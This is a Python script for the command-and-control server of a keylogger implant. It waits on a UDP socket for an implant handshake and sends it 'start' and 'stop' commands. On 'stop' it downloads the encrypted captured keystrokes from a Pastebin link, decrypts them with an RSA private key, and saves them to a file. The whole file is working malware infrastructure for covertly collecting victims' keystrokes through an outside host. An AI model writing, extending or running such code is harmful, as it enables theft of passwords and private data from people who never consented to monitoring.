import socket
from requests import get
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP


# decrypts input string using our private key
def decrypt(ciphertext):
    # convert string to bytes object
    data = ciphertext

    # Read private key
    pkey = RSA.importKey(open('private.pem').read())
    cipher2 = PKCS1_OAEP.new(pkey)
    result = cipher2.decrypt(data)
    outfile = open("./keylogger_data.txt", "w")  # save decryption to file
    outfile.write(result.decode("utf-8"))
    print(result)  # print decryption


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#ip = get('https://api.ipify.org').text
#print('My public IP address is:', ip)

ip = "192.168.1.143" # C2 Server IP wildcard
port = 10102 # C2 Server port
addr = (ip, port)
sock.bind(addr)

print("Waiting for implant handshake")
msg, send_addr = sock.recvfrom(20)
print("Implant is @", send_addr)
commands = ["start", "stop"]

while True:
    cmd = input("cmd>")
    print(cmd)
    if cmd in commands:
        sock.sendto(cmd.encode(), send_addr)
        if cmd == "stop":
            msg, send_addr = sock.recvfrom(64)
            msg = "https://pastebin.com/"+msg
            encrypted_keylog = get(msg).text
            decrypt(encrypted_keylog)
            exit()
    else:
        exit()


